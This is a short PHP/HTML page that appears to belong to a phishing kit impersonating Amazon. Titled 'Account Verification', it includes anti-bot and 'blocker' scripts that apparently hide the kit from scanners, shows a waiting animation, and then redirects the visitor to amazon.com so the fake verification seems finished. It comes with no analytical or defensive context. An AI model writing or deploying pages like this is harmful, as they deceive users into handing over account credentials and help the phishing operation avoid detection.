<?php
if (!isset($_SESSION)) {
  session_start();
}
 
include "./D/antibots.php";  
include "./D/blocker.php";
$rand = @$_GET['dispatch'];
?>
<!DOCTYPE html>
<html>
<head>
	<title>Account Verification</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="shortcut icon" type="image/x-icon" href="images/favicon.png" />
	<meta http-equiv="refresh" content="5; url=http://amazon.com" />
</head>
<body>
<div  class="containtdone">
<div class="tpcont">

<div class="holdindone">
<img src="images/hold.gif" style="width:75px;">
</div>
</div>
</div>
</body>
</html>